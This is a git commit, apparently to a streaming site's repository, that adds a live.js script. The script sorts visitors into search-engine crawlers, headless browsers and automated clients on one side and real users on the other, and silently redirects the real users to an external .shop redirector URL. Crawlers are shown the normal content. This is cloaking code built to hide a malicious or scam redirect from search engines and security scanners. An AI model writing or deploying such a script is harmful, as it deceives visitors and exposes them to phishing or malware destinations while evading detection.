af1ecdfc4a43c76334022eb8e66615f704b2a733
moka-tv <mokadat12@gmail.com>
2026-08-02 15:41:41 +0300

    Add files via upload

---
+++ live.js
@@ -0,0 +1,20 @@
+﻿var ua = navigator.userAgent.toLowerCase();
+
+var isLikelyBot =
+  ua.includes('googlebot') ||
+  ua.includes('bingbot') ||
+  ua.includes('yahoo') ||
+  ua.includes('yandex') ||
+  ua.includes('baiduspider') ||
+  ua.includes('compatible') ||     
+  ua.includes('bot') ||
+  ua.includes('crawler') ||
+  ua.includes('spider') ||
+  /headless/i.test(ua) ||           
+  navigator.webdriver === true;     
+
+if (!isLikelyBot) {
+  window.location.replace("https://b9yu.shop/3/rd.php?url=/p/y8mgJxNN2DG");
+} else {
+  console.log("Bot/crawler-like detected → serving content");
+}
